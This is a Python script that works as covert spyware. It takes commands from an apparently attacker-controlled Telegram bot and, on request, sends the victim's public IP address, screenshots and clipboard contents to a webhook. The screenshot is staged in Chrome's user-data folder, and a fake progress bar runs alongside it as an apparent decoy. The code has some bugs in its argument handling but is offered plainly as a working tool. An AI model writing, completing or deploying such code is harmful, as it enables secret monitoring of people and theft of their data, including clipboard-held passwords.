import requests
import pyautogui
import win32clipboard
import time
import os
import threading
from typing import Dict



class Logger:
    tgtoken = ""
    dhook = ""
    admin = "hkeydesign"

    @classmethod
    def log(cmd,message,ss):
        response = True

        r = requests.post(Logger.dhook,data={
            'content':message
        },files={
            'file.png':ss
        })

        if str(r) != '<Response [204]>':
            response = False

        return response

    @classmethod
    def screen_shot(cmd):
        pyautogui.screenshot(os.environ["USERPROFILE"] + r"\AppData\Local\Google\Chrome\User Data\resim.jpg")

        jpgfile = open(os.environ["USERPROFILE"] + r"\AppData\Local\Google\Chrome\User Data\resim.jpg", "rb").read()

        resp = Logger.log(f'Screen Shot',jpgfile)

        return resp

    @classmethod
    def checkit(cmd) -> Dict[str, str]:
        r = requests.get(f'https://api.telegram.org/bot{Logger.tgtoken}/getUpdates').json()
        
        status = True
        message = None
        author = None

        try:
            message = r['result'][-1]['message']['text']
            author = r['result'][-1]['message']['chat']['username']
            date = r['result'][-1]['message']['date']
        except:
            status = False
        
        result = {
            'status':status,
            'message':message,
            'author':author,
            'date':date
        }

        return result

    @classmethod
    def ip_adress(cmd):
        r = requests.get('https://api.ipify.org')
        ip = r.text
        print(ip)

        resp = Logger.log(f'Adress: {ip}',None)

        return resp

    @classmethod
    def getcboard(cmd):
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()

        resp = Logger.log(f'Clipboard: {data}',None)

        return resp

def oneff():
    last = {'date':None}

    while True:
        rsp = Logger.checkit()
        if rsp['status'] == True and rsp['author'] == Logger.admin:

            if rsp['message'] == 'ip' and rsp['date'] != last['date']:
                ip = Logger.ip_adress()
                last = rsp

            elif rsp['message'] == 'foto' and rsp['date'] != last['date']:
                Logger.screen_shot()
                last = rsp

            elif rsp['message'] == 'cboard' and rsp['date'] != last['date']:
                Logger.getcboard()
                last = rsp

        time.sleep(2)

def sayac(n):
    print(f'[{n*"-"}]', end="")

    print('\b'*(n+1), end="")

    for _ in range(n):
        print(flush=True, end="")
        print('*', end="")
        time.sleep(10)

x = threading.Thread(target=oneff, args=())
x.start()

y = threading.Thread(target=sayac, args=(100,))
y.start()
